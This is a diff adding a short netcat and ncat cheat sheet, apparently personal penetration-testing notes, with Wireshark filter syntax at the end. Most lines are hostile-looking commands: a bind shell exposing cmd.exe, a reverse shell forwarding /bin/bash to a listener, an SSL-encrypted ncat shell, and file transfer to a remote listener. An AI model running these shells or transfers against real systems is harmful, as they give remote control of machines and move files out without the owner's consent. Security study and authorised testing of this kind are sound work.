@@ -1,0 +1,25 @@
+#command to set up listener to receive files
+nc -nlvp {port no} > {filename}
+
+#command to send file to listener
+nc -nv {ip} {port} < {filepath}
+
+#Bind remote shell
+nc -lvp {port no} -e cmd.exe
+
+#reverse shell example
+#set up listener
+nc -lvp {port no}
+#forward shell to listener
+nc -vn {ip} {port no} -e /bin/bash
+
+#encrypted tunnel using Ncat
+#server
+ncat -lvp {port no} -e cmd.exe --allow {ip} --ssl
+#client
+ncat -v {ip} {port no} --ssl
+
+#wireshark filters syntax
+host {ip}
+port {port no}
+
